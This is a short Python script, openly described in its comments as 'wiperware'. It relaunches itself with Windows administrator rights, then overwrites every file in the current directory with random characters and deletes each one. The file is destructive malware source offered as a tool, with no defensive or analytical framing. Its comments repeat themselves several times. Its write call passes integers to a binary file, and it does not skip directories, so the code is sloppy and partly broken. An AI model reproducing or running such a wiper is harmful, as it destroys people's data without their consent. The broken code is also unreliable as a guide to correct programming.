# create a wiperware that performs an irreversible deletion of data on a disk
# this is a simple script that will overwrite the data on a disk with random data
# this is not a secure way to delete data, but it is a way to delete data
# this script will overwrite the data on a disk with random data
# this script will overwrite the data on a disk with random data
# this script will overwrite the data on a disk with random data
# Notice the repeated message ...

import os
import random
import string
import sys
import ctypes

#delte a file in windows
def delete_file(file_name):
    # get the size of the file
    file_size = os.path.getsize(file_name)
    # open the file for writing
    with open(file_name, 'wb') as f:
        # write random data to the file
        for i in range(file_size):
            f.write(random.choice((string.ascii_uppercase + string.digits).encode('utf-8')))
    # delete the file
    os.remove(file_name)

# function to elevete the script to admin
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def main():
    # get the list of files in current directory windows
    file_list = os.listdir('.')
    # delete each file
    for file_name in file_list:
        delete_file(file_name)
    

if __name__ == '__main__':
    # if the script is not elevated, elevate it
    if not is_admin():
        # relaunch the script as admin
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    else:
        # the script is elevated, continue
        main()